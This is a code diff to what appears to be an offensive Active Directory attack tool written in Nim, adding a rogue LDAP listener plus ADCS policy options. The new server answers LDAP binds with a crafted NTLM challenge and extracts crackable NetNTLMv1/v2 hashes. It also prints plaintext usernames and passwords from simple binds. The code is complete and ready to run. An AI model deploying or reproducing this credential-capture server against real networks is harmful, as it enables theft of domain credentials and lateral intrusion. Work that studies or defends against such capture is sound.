@@ -305,6 +305,10 @@ type
     ldapDnsData: string
     ldapDnsTtl: int
     ldapAdcsTemplateModify: bool
+    ldapCaptureServer: bool
+    ldapCaptureHost: string
+    ldapCapturePort: int
+    ldapCaptureChallenge: string
     ldapSetScriptPath: bool
     ldapScriptPath: string
     ldapAddMember: bool
@@ -593,6 +597,10 @@ ATTACK SHORTCUTS
   --adcs-request --adcs-rpc --ca <name> --template <name> --on-behalf-of <domain\\user> [--cert <ea.cer> --key <ea.key>]
   --adcs-auth --upn <user@realm> --pfx <file> --ccache <file>
   --adcs-template --template <name> --replace <attr=value>
+  --server              Run LDAP NTLM capture server
+  --srvhost <ip>        LDAP capture listen address (default 0.0.0.0)
+  --srvport <port>      LDAP capture listen port (default 389)
+  --challenge <hex>     8-byte NTLM challenge as 16 hex chars; random if omitted
   --dns-add --zone <zone> --record <name> --type A --data <ipv4> [--ttl <sec>]
   --dns-replace --zone <zone> --record <name> --type A --data <ipv4> [--ttl <sec>]
   --dns-delete --zone <zone> --record <name>
@@ -2072,6 +2080,7 @@ proc parseCli(): CliConfig =
     "service", "altservice", "alt-service", "aes-key", "kdc-key",
     "startup", "schtask", "task-name", "task-cmd", "task-args", "task-user", "script-params",
     "on-behalf-of", "listener", "coerce-target", "capture-host", "capture-user", "capture-password", "capture-pass", "capture-hash", "capture-domain", "capture-out", "ticket-user", "ticket-service", "capture-seconds", "capture-interval", "script-path", "bind", "auth",
+    "srvhost", "srvport", "challenge",
     "socks-port", "pid", "socks-remote", "socks-task", "control-port",
     "new-hash", "target-dn"]
   var rawArgs = commandLineParams()
@@ -2125,8 +2134,8 @@ proc parseCli(): CliConfig =
       "remove-ace", "delete-user", "delete-computer", "delete-group", "delete",
       "ldif", "nested-groups", "acl", "include-deleted", "gpo", "add", "laps-schema",
       "deny", "allow", "exact", "ls", "no-bump", "dry-run", "adcs", "startup", "schtask", "create-gpo", "delegate",
-      "adcs-request", "adcs-auth", "adcs-rpc", "cert-inventory", "cert-map", "remove-map", "opsec-notes", "decrypt-mslaps",
-      "get-gmsa", "dns-add", "dns-delete", "dns-replace", "adcs-template",
+      "adcs-request", "adcs-auth", "adcs-rpc", "adcs-policy", "adcs-get-editflags", "adcs-get-disable-extension-list", "cert-inventory", "cert-map", "remove-map", "opsec-notes", "decrypt-mslaps",
+      "get-gmsa", "dns-add", "dns-delete", "dns-replace", "adcs-template", "server",
       "add-member", "remove-member", "restore-deleted", "move", "bloodhound", "legacy", "recursive", "full", "trust-keys",
       "lockout-aware", "schannel", "reverse",
       "user-process",
@@ -2740,6 +2749,27 @@ proc parseCli(): CliConfig =
         result.ldapAdcsUpn = value
       of "dns-name":
         result.ldapAdcsDns = value
+      of "adcs-set-editflags":
+        result.ldapAdcsPolicySet = true
+        result.ldapAdcsSetEditFlags = value
+      of "adcs-get-editflags":
+        result.ldapAdcsPolicySet = true
+        result.ldapAdcsGetEditFlags = true
+      of "adcs-get-disable-extension-list":
+        result.ldapAdcsPolicySet = true
+        result.ldapAdcsGetDisableExtensionList = true
+      of "adcs-set-disable-extension-list":
+        result.ldapAdcsPolicySet = true
+        result.ldapAdcsSetDisableExtensionListPresent = true
+        result.ldapAdcsSetDisableExtensionList = value
+      of "server":
+        result.ldapCaptureServer = true
+      of "srvhost":
+        result.ldapCaptureHost = value
+      of "srvport":
+        result.ldapCapturePort = parseInt(value)
+      of "challenge":
+        result.ldapCaptureChallenge = value
       of "on-behalf-of":
         result.ldapAdcsOnBehalfOf = value
       of "decrypt-mslaps":
@@ -2914,6 +2944,16 @@ proc parseCli(): CliConfig =
       discard
   if result.ports.len == 0 and result.port != 0:
     result.ports.add result.port
+
+  if result.protocol == "ldap" and result.ldapAdcsRequest and
+      result.ldapAdcsSid.len == 0 and result.krb5Sid.len > 0:
+    result.ldapAdcsSid = result.krb5Sid
+
+  if result.protocol == "ldap" and result.ldapCaptureServer:
+    if result.ldapCaptureHost.len == 0:
+      result.ldapCaptureHost = "0.0.0.0"
+    if result.ldapCapturePort == 0:
+      result.ldapCapturePort = 389
 
   if result.protocol == "ldap" and result.ldapGetGmsa and not result.useSsl and result.port == 389:
     result.useSsl = true
@@ -7278,6 +7318,532 @@ proc utf16LeToDisplay(raw: string): string =
     else:
       result.add "\\u" & toHex((hi shl 8) or lo, 4)
     i += 2
+
+proc ldapCapAddLen(data: var string; length: int) =
+  if length < 128:
+    data.add char(length)
+  elif length <= 0xff:
+    data.add char(0x81)
+    data.add char(length)
+  elif length <= 0xffff:
+    data.add char(0x82)
+    data.add char((length shr 8) and 0xff)
+    data.add char(length and 0xff)
+  else:
+    data.add char(0x84)
+    data.add char((length shr 24) and 0xff)
+    data.add char((length shr 16) and 0xff)
+    data.add char((length shr 8) and 0xff)
+    data.add char(length and 0xff)
+
+proc ldapCapTlv(tag: int; body: string): string =
+  result.add char(tag)
+  result.ldapCapAddLen body.len
+  result.add body
+
+proc ldapCapInteger(value: int): string =
+  var body = ""
+  if value == 0:
+    body.add '\0'
+  else:
+    var bytes: seq[char] = @[]
+    var v = value
+    while v > 0:
+      bytes.insert(char(v and 0xff), 0)
+      v = v shr 8
+    if bytes.len > 0 and (ord(bytes[0]) and 0x80) != 0:
+      bytes.insert('\0', 0)
+    for b in bytes:
+      body.add b
+  ldapCapTlv(0x02, body)
+
+proc ldapCapEnum(value: int): string =
+  var body = ""
+  if value == 0:
+    body.add '\0'
+  else:
+    var bytes: seq[char] = @[]
+    var v = value
+    while v > 0:
+      bytes.insert(char(v and 0xff), 0)
+      v = v shr 8
+    if bytes.len > 0 and (ord(bytes[0]) and 0x80) != 0:
+      bytes.insert('\0', 0)
+    for b in bytes:
+      body.add b
+  ldapCapTlv(0x0a, body)
+
+proc ldapCapReadLen(data: string; offset: var int): int =
+  if offset >= data.len: return -1
+  let first = ord(data[offset])
+  inc offset
+  if (first and 0x80) == 0:
+    return first
+  let count = first and 0x7f
+  if count == 0 or count > 4 or offset + count > data.len:
+    return -1
+  result = 0
+  for _ in 0 ..< count:
+    result = (result shl 8) or ord(data[offset])
+    inc offset
+
+proc ldapCapRecvExact(client: Socket; count: int): string =
+  while result.len < count:
+    let chunk = client.recv(count - result.len)
+    if chunk.len == 0:
+      result.setLen(0)
+      return
+    result.add chunk
+
+proc ldapCapRecvPacket(client: Socket): string =
+  let tag = ldapCapRecvExact(client, 1)
+  if tag.len == 0:
+    return ""
+  let firstLen = ldapCapRecvExact(client, 1)
+  if firstLen.len == 0:
+    return ""
+  result = tag & firstLen
+  let first = ord(firstLen[0])
+  var bodyLen = 0
+  if (first and 0x80) == 0:
+    bodyLen = first
+  else:
+    let count = first and 0x7f
+    if count == 0 or count > 4:
+      return ""
+    let lenBytes = ldapCapRecvExact(client, count)
+    if lenBytes.len != count:
+      return ""
+    result.add lenBytes
+    for c in lenBytes:
+      bodyLen = (bodyLen shl 8) or ord(c)
+  let body = ldapCapRecvExact(client, bodyLen)
+  if body.len != bodyLen:
+    return ""
+  result.add body
+
+proc ldapCapReadTlv(data: string; offset: var int): tuple[tag: int, body: string] =
+  if offset >= data.len:
+    return (-1, "")
+  let tag = ord(data[offset])
+  inc offset
+  let length = ldapCapReadLen(data, offset)
+  if length < 0 or offset + length > data.len:
+    return (-1, "")
+  result = (tag, data[offset ..< offset + length])
+  offset += length
+
+proc ldapCapParseInt(body: string): int =
+  for c in body:
+    result = (result shl 8) or ord(c)
+
+proc ldapCapMessageId(packet: string): int =
+  var off = 0
+  let outer = ldapCapReadTlv(packet, off)
+  if outer.tag != 0x30:
+    return 1
+  var innerOff = 0
+  let mid = ldapCapReadTlv(outer.body, innerOff)
+  if mid.tag != 0x02:
+    return 1
+  result = ldapCapParseInt(mid.body)
+
+proc ldapCapOperationTag(packet: string): int =
+  var off = 0
+  let outer = ldapCapReadTlv(packet, off)
+  if outer.tag != 0x30:
+    return -1
+  var innerOff = 0
+  discard ldapCapReadTlv(outer.body, innerOff)
+  let op = ldapCapReadTlv(outer.body, innerOff)
+  op.tag
+
+proc ldapCapDnFromDomain(domain: string): string =
+  let clean = domain.strip().strip(chars = {'.'})
+  if clean.len == 0:
+    return ""
+  var parts: seq[string] = @[]
+  for part in clean.split('.'):
+    let p = part.strip()
+    if p.len > 0:
+      parts.add "DC=" & p
+  parts.join(",")
+
+proc ldapCapAttribute(name: string; values: seq[string]): string =
+  var vals = ""
+  for value in values:
+    vals.add ldapCapTlv(0x04, value)
+  ldapCapTlv(0x30, ldapCapTlv(0x04, name) & ldapCapTlv(0x31, vals))
+
+proc ldapCapSearchResultEntry(messageId: int; domain: string): string =
+  let baseDn = ldapCapDnFromDomain(domain)
+  var attrs = ""
+  attrs.add ldapCapAttribute("supportedLDAPVersion", @["3"])
+  attrs.add ldapCapAttribute("supportedSASLMechanisms", @["NTLM", "GSS-SPNEGO"])
+  if baseDn.len > 0:
+    attrs.add ldapCapAttribute("defaultNamingContext", @[baseDn])
+    attrs.add ldapCapAttribute("namingContexts", @[baseDn])
+  let body = ldapCapTlv(0x04, "") & ldapCapTlv(0x30, attrs)
+  ldapCapTlv(0x30, ldapCapInteger(messageId) & ldapCapTlv(0x64, body))
+
+proc ldapCapSearchDone(messageId: int; resultCode = 0; diagnostic = ""): string =
+  var body = ldapCapEnum(resultCode)
+  body.add ldapCapTlv(0x04, "")
+  body.add ldapCapTlv(0x04, diagnostic)
+  ldapCapTlv(0x30, ldapCapInteger(messageId) & ldapCapTlv(0x65, body))
+
+proc ldapCapSearchResponse(messageId: int; domain: string): string =
+  ldapCapSearchResultEntry(messageId, domain) & ldapCapSearchDone(messageId)
+
+proc ldapCapParseSimpleBind(packet: string): tuple[ok: bool, messageId: int, username: string, password: string] =
+  var off = 0
+  let outer = ldapCapReadTlv(packet, off)
+  if outer.tag != 0x30:
+    return (false, 1, "", "")
+  var innerOff = 0
+  let mid = ldapCapReadTlv(outer.body, innerOff)
+  if mid.tag != 0x02:
+    return (false, 1, "", "")
+  let messageId = ldapCapParseInt(mid.body)
+  let bindReq = ldapCapReadTlv(outer.body, innerOff)
+  if bindReq.tag != 0x60:
+    return (false, messageId, "", "")
+  var bindOff = 0
+  discard ldapCapReadTlv(bindReq.body, bindOff)
+  let name = ldapCapReadTlv(bindReq.body, bindOff)
+  if name.tag != 0x04:
+    return (false, messageId, "", "")
+  let auth = ldapCapReadTlv(bindReq.body, bindOff)
+  if auth.tag != 0x80:
+    return (false, messageId, "", "")
+  (name.body.len > 0 or auth.body.len > 0, messageId, name.body, auth.body)
+
+proc ldapCapBindResponse(messageId, resultCode: int; saslCreds = ""; diagnostic = ""): string =
+  var body = ldapCapEnum(resultCode)
+  body.add ldapCapTlv(0x04, "")
+  body.add ldapCapTlv(0x04, diagnostic)
+  if saslCreds.len > 0:
+    body.add ldapCapTlv(0x87, saslCreds)
+  ldapCapTlv(0x30, ldapCapInteger(messageId) & ldapCapTlv(0x61, body))
+
+proc ldapCapHexToBytes(hex: string): string =
+  if hex.len mod 2 != 0:
+    return ""
+  for i in countup(0, hex.len - 2, 2):
+    try:
+      result.add char(parseHexInt(hex[i .. i + 1]))
+    except ValueError:
+      return ""
+
+proc ldapCapSecureRandomBytes(count: int): string =
+  var f: File
+  if open(f, "/dev/urandom", fmRead):
+    defer: f.close()
+    result = newString(count)
+    let got = f.readChars(result, 0, count)
+    if got == count:
+      return
+  result.setLen(0)
+  result = smbclient.randomBytes(count)
+
+proc ldapCapChallenge(value: string): string =
+  let clean = value.strip().replace(" ", "").replace(":", "")
+  if clean.len > 0:
+    if clean.len != 16:
+      raise newException(ValueError, "--challenge must be exactly 16 hex characters")
+    for c in clean:
+      if c notin {'0'..'9', 'a'..'f', 'A'..'F'}:
+        raise newException(ValueError, "--challenge must contain only hex characters")
+    let decoded = ldapCapHexToBytes(clean)
+    if decoded.len != 8:
+      raise newException(ValueError, "--challenge must decode to exactly 8 bytes")
+    return decoded
+  ldapCapSecureRandomBytes(8)
+
+proc ldapCapFiletimeNow(): uint64 =
+  uint64(getTime().toUnix() + 11644473600'i64) * 10000000'u64
+
+proc ldapCapAvPair(kind: uint16; value: string): string =
+  result.addU16LeLocal kind
+  result.addU16LeLocal uint16(value.len)
+  result.add value
+
+proc ldapCapBuildType2(challenge: string; target = "NIMUX"): string =
+  const
+    ntlmNegotiateUnicode = 0x00000001'u32
+    ntlmRequestTarget = 0x00000004'u32
+    ntlmNegotiateNtlm = 0x00000200'u32
+    ntlmNegotiateAlwaysSign = 0x00008000'u32
+    ntlmTargetTypeServer = 0x00020000'u32
+    ntlmNegotiateExtendedSessionSecurity = 0x00080000'u32
+    ntlmNegotiateTargetInfo = 0x00800000'u32
+    ntlmNegotiateVersion = 0x02000000'u32
+    ntlmNegotiate128 = 0x20000000'u32
+    ntlmNegotiate56 = 0x80000000'u32
+  let targetUtf = smbclient.toUtf16Le(target)
+  var targetInfo = ""
+  targetInfo.add ldapCapAvPair(2, smbclient.toUtf16Le(target))
+  targetInfo.add ldapCapAvPair(1, smbclient.toUtf16Le(target))
+  targetInfo.add ldapCapAvPair(4, smbclient.toUtf16Le("nimux.local"))
+  targetInfo.add ldapCapAvPair(3, smbclient.toUtf16Le("nimux.local"))
+  var ts = ""
+  ts.addU64LeLocal ldapCapFiletimeNow()
+  targetInfo.add ldapCapAvPair(7, ts)
+  targetInfo.addU16LeLocal 0
+  targetInfo.addU16LeLocal 0
+  let flags = ntlmNegotiateUnicode or ntlmRequestTarget or ntlmNegotiateNtlm or
+    ntlmNegotiateAlwaysSign or ntlmTargetTypeServer or ntlmNegotiateExtendedSessionSecurity or
+    ntlmNegotiateTargetInfo or ntlmNegotiateVersion or ntlmNegotiate128 or ntlmNegotiate56
+  let targetOffset = 56'u32
+  let infoOffset = targetOffset + uint32(targetUtf.len)
+  result.add "NTLMSSP\0"
+  result.addU32LeLocal 2
+  result.addU16LeLocal uint16(targetUtf.len)
+  result.addU16LeLocal uint16(targetUtf.len)
+  result.addU32LeLocal targetOffset
+  result.addU32LeLocal flags
+  result.add challenge
+  result.add repeat('\0', 8)
+  result.addU16LeLocal uint16(targetInfo.len)
+  result.addU16LeLocal uint16(targetInfo.len)
+  result.addU32LeLocal infoOffset
+  result.add "\x06\x01\xb1\x1d\x00\x00\x00\x0f"
+  result.add targetUtf
+  result.add targetInfo
+
+proc ldapCapDerOid(body: string): string =
+  ldapCapTlv(0x06, body)
+
+proc ldapCapSpnegoResponse(ntlmType2: string): string =
+  const ntlmOid = "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"
+  let negState = ldapCapTlv(0xa0, ldapCapTlv(0x0a, "\x01"))
+  let supportedMech = ldapCapTlv(0xa1, ldapCapDerOid(ntlmOid))
+  let responseToken = ldapCapTlv(0xa2, ldapCapTlv(0x04, ntlmType2))
+  ldapCapTlv(0xa1, ldapCapTlv(0x30, negState & supportedMech & responseToken))
+
+proc ldapCapSecBuf(data: string; offset: int): tuple[length: int, bufferOffset: int] =
+  if offset + 7 >= data.len:
+    return (0, 0)
+  (int(readU16LeLocal(data, offset)), int(readU32LeLocal(data, offset + 4)))
+
+proc ldapCapSlice(data: string; offset, length: int): string =
+  if offset < 0 or length < 0 or offset + length > data.len:
+    return ""
+  data[offset ..< offset + length]
+
+proc ldapCapDecodeNtlmString(data: string; secOff: int; unicode: bool): string =
+  let sec = ldapCapSecBuf(data, secOff)
+  let raw = ldapCapSlice(data, sec.bufferOffset, sec.length)
+  if unicode:
+    utf16LeToDisplay(raw)
+  else:
+    raw.strip(chars = {'\0'})
+
+proc ldapCapParseType3(type3, challengeHex: string): JsonNode =
+  result = %*{"valid": false}
+  if type3.len < 64 or not type3.startsWith("NTLMSSP\0") or readU32LeLocal(type3, 8) != 3'u32:
+    result["message"] = %"not an NTLMSSP type 3 message"
+    return
+  let flags = readU32LeLocal(type3, 60)
+  let unicode = (flags and 0x00000001'u32) != 0
+  let lm = ldapCapSecBuf(type3, 12)
+  let nt = ldapCapSecBuf(type3, 20)
+  let domain = ldapCapDecodeNtlmString(type3, 28, unicode)
+  let user = ldapCapDecodeNtlmString(type3, 36, unicode)
+  let workstation = ldapCapDecodeNtlmString(type3, 44, unicode)
+  let lmResp = ldapCapSlice(type3, lm.bufferOffset, lm.length)
+  let ntResp = ldapCapSlice(type3, nt.bufferOffset, nt.length)
+  result["valid"] = %true
+  result["username"] = %user
+  result["domain"] = %domain
+  result["workstation"] = %workstation
+  result["challenge"] = %challengeHex
+  result["lm_response"] = %lmResp.binaryHex()
+  result["nt_response"] = %ntResp.binaryHex()
+  if ntResp.len > 16:
+    let proof = ntResp[0 ..< 16].binaryHex()
+    let blob = ntResp[16 .. ^1].binaryHex()
+    result["netntlmv2"] = %(user & "::" & domain & ":" & challengeHex & ":" & proof & ":" & blob)
+  elif ntResp.len > 0:
+    result["netntlm"] = %(user & "::" & domain & ":" & challengeHex & ":" &
+      ntResp.binaryHex() & ":" & lmResp.binaryHex())
+
+proc ldapCapFindNtlm(packet: string): tuple[kind: int, token: string, spnego: bool] =
+  let idx = packet.find("NTLMSSP\0")
+  if idx < 0 or idx + 12 > packet.len:
+    return (0, "", false)
+  let kind = int(readU32LeLocal(packet, idx + 8))
+  let spnego = packet.find("GSS-SPNEGO") >= 0 or idx > 0
+  (kind, packet[idx .. ^1], spnego)
+
+proc ldapCapColorEnabled(): bool =
+  not (getEnv("NO_COLOR").len > 0) and
+    not ("--no-color" in commandLineParams()) and
+    isatty(stdout)
+
+proc ldapCapEsc(code, text: string): string =
+  if ldapCapColorEnabled(): "\e[" & code & "m" & text & "\e[0m"
+  else: text
+
+proc ldapCapBold(text: string): string = ldapCapEsc("1", text)
+proc ldapCapDim(text: string): string = ldapCapEsc("2", text)
+proc ldapCapGreen(text: string): string = ldapCapEsc("32", text)
+proc ldapCapRed(text: string): string = ldapCapEsc("31", text)
+proc ldapCapGray(text: string): string = ldapCapEsc("90", text)
+proc ldapCapBrightCyan(text: string): string = ldapCapEsc("1;36", text)
+
+proc ldapCapColorTitle(title: string): string =
+  let parts = title.split("  ", maxsplit = 1)
+  if parts.len == 2:
+    ldapCapBold(parts[0]) & "  " & ldapCapBrightCyan(parts[1])
+  else:
+    ldapCapBold(title)
+
+proc ldapCapColorValue(label, value: string): string =
+  case label
+  of "status":
+    if value in ["listening", "connected", "captured"]:
+      ldapCapGreen(value)
+    elif value in ["failed", "down", "error"]:
+      ldapCapRed(value)
+    else:
+      value
+  of "peer", "challenge", "message id", "user", "workstation":
+    ldapCapBrightCyan(value)
+  of "password":
+    ldapCapGreen(value)
+  else:
+    value
+
+proc ldapCapBox(title: string; lines: seq[tuple[label: string, value: string]]; section = ""; sectionLines: seq[string] = @[]): string =
+  const width = 78
+  let head = "┌─ " & title & " "
+  result = ldapCapGray("┌─ ") & ldapCapColorTitle(title) &
+    ldapCapGray(" " & repeat("─", max(3, width - head.len)))
+  for line in lines:
+    result.add "\n" & ldapCapGray("│  ") &
+      ldapCapDim(alignLeft(line.label, 12)) &
+      ldapCapColorValue(line.label, line.value)
+  if section.len > 0:
+    let mid = "├─ " & section & " "
+    result.add "\n" & ldapCapGray("├─ ") & ldapCapBold(section) &
+      ldapCapGray(" " & repeat("─", max(3, width - mid.len)))
+    for item in sectionLines:
+      result.add "\n" & ldapCapGray("│  ") & item
+  result.add "\n" & ldapCapGray("└" & repeat("─", width - 1))
+
+proc ldapCapPrintEvent(event: JsonNode; jsonOutput: bool) =
+  if jsonOutput:
+    echo $event
+    flushFile(stdout)
+    return
+  case event{"event"}.getStr()
+  of "listening":
+    echo ldapCapBox("LDAP CAPTURE  " & event{"listen"}.getStr(), @[
+      ("status", "listening"),
+      ("challenge", event{"challenge"}.getStr())
+    ])
+  of "connection":
+    echo ldapCapBox("LDAP CONNECTION", @[
+      ("peer", event{"peer"}.getStr()),
+      ("status", "connected")
+    ])
+  of "type1":
+    echo ldapCapBox("LDAP NTLM NEGOTIATE", @[
+      ("peer", event{"peer"}.getStr()),
+      ("message id", $event{"message_id"}.getInt())
+    ])
+  of "simple":
+    echo ldapCapBox("LDAP SIMPLE CREDENTIAL", @[
+      ("peer", event{"peer"}.getStr()),
+      ("user", event{"username"}.getStr()),
+      ("password", event{"password"}.getStr())
+    ])
+  of "capture":
+    var lines: seq[tuple[label: string, value: string]] = @[
+      ("peer", event{"peer"}.getStr()),
+      ("user", event{"domain"}.getStr() & "\\" & event{"username"}.getStr()),
+      ("challenge", event{"challenge"}.getStr())
+    ]
+    if event{"workstation"}.getStr().len > 0:
+      lines.add ("workstation", event{"workstation"}.getStr())
+    var hashLines: seq[string] = @[]
+    if event{"netntlmv2"}.getStr().len > 0:
+      hashLines.add "netntlmv2  " & event{"netntlmv2"}.getStr()
+    elif event{"netntlm"}.getStr().len > 0:
+      hashLines.add "netntlm    " & event{"netntlm"}.getStr()
+    else:
+      hashLines.add "nt_response " & event{"nt_response"}.getStr()
+    echo ldapCapBox("LDAP NTLM CAPTURE", lines, "Hash", hashLines)
+  of "error":
+    stderr.writeLine "[ldap] error: " & event{"message"}.getStr()
+  else:
+    echo $event
+  flushFile(stdout)
+
+proc runLdapCaptureServer(config: CliConfig) =
+  let challenge = ldapCapChallenge(config.ldapCaptureChallenge)
+  let challengeHex = challenge.binaryHex()
+  var server = newSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+  server.setSockOpt(OptReuseAddr, true)
+  server.bindAddr(Port(config.ldapCapturePort), config.ldapCaptureHost)
+  server.listen()
+  ldapCapPrintEvent(%*{"event": "listening",
+    "listen": config.ldapCaptureHost & ":" & $config.ldapCapturePort,
+    "challenge": challengeHex}, config.jsonOutput)
+  while true:
+    var client = newSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+    server.accept(client)
+    var peer = ""
+    try:
+      peer = $client.getPeerAddr()
+    except CatchableError:
+      peer = "unknown"
+    ldapCapPrintEvent(%*{"event": "connection", "peer": peer}, config.jsonOutput)
+    try:
+      while true:
+        let packet = ldapCapRecvPacket(client)
+        if packet.len == 0:
+          break
+        let messageId = ldapCapMessageId(packet)
+        let ntlm = ldapCapFindNtlm(packet)
+        case ntlm.kind
+        of 1:
+          ldapCapPrintEvent(%*{"event": "type1", "peer": peer,
+            "message_id": messageId}, config.jsonOutput)
+          let type2 = ldapCapBuildType2(challenge)
+          let creds = if ntlm.spnego: ldapCapSpnegoResponse(type2) else: type2
+          client.send ldapCapBindResponse(messageId, 14, creds)
+        of 3:
+          let parsed = ldapCapParseType3(ntlm.token, challengeHex)
+          parsed["event"] = %"capture"
+          parsed["peer"] = %peer
+          ldapCapPrintEvent(parsed, config.jsonOutput)
+          client.send ldapCapBindResponse(messageId, 49, "", "invalidCredentials")
+          break
+        else:
+          let simple = ldapCapParseSimpleBind(packet)
+          if simple.ok:
+            ldapCapPrintEvent(%*{"event": "simple", "peer": peer,
+              "message_id": simple.messageId, "username": simple.username,
+              "password": simple.password}, config.jsonOutput)
+            client.send ldapCapBindResponse(simple.messageId, 49, "", "invalidCredentials")
+            break
+          case ldapCapOperationTag(packet)
+          of 0x63:
+            client.send ldapCapSearchResponse(messageId, config.domain)
+          of 0x42:
+            break
+          else:
+            client.send ldapCapBindResponse(messageId, 2, "", "NTLM SASL required")
+            break
+    except CatchableError as error:
+      ldapCapPrintEvent(%*{"event": "error", "peer": peer,
+        "message": error.msg}, config.jsonOutput)
+    try:
+      client.close()
+    except CatchableError:
+      discard
 
 proc ldapFilterEscapeValue(value: string): string =
   for c in value:
@@ -15531,6 +16097,9 @@ proc main() =
       configureProxy(config.proxySpec)
     if config.protocol == "krb5conf":
       runKrb5Conf(config)
+      return
+    if config.protocol == "ldap" and config.ldapCaptureServer:
+      runLdapCaptureServer(config)
       return
     if config.cliMode:
       case config.protocol
